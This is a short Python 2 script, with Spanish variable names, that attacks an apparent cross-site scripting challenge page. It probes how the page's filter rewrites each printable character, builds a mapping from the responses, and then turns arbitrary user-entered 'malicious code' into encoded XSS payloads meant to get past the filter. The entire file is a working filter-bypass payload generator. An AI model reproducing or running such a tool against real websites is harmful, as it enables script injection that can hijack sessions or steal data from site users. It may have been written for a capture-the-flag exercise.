#!/usr/bin/python
import urllib
import pprint
import urllib2
import re
import base64


pagina = "http://hubpi.co/retoxss/?"
variable = "bypass"
exp_reg = "<span class=\"vector\">[\s*\S*]*</span>\n"
exp_reg2 = ">[\s*\S*]*<"
	
#try:
#diccionario = ["<script>promt(12323)</script>","alexis"]
diccionario = []
ascii = []
equivalenciaweb = [127]
i = 0
inicioascii = 32
for i in range(inicioascii,127):
	x = "&#" + str(i)
	diccionario.append(x)
	ascii.append(chr(i))

for palabra in ascii:
	parametros = urllib.urlencode({variable:palabra})
	request = urllib2.Request(pagina,parametros)
	paquete = urllib2.urlopen(request)

	respuesta = paquete.read()
	#print respuesta
	xss = re.findall(exp_reg,respuesta)
	for cadena in xss:
		salida = re.findall(exp_reg2,cadena)
		for respuesta in salida:
			respuesta = respuesta[1:len(respuesta)-1]
			#equivalenciaweb.append(respuesta)
			equivalenciaweb.insert(ord(palabra),respuesta)
			print palabra + " : "+respuesta

print(equivalenciaweb)
codigomalicioso = ''
while codigomalicioso != "exit":
	codigomalicioso = raw_input("\n\nCual es el codigo que desea insertar \n")
	banneados = [48]
	z = ""
	for i in range(0,len(codigomalicioso)):
		car = ord(codigomalicioso[i])
		indice = -1
		try:
			indice = equivalenciaweb.index(codigomalicioso[i]) +(inicioascii-1)
			if indice >= inicioascii:
				z = z+chr(indice)
		except:
			if car in banneados:
				z = z+"&#"+hex(car)+""
				z = z.replace('0','')
			else:
				z = z+diccionario[car]
	print "Prueba con el siguiente payload:  \n\n\n"+z

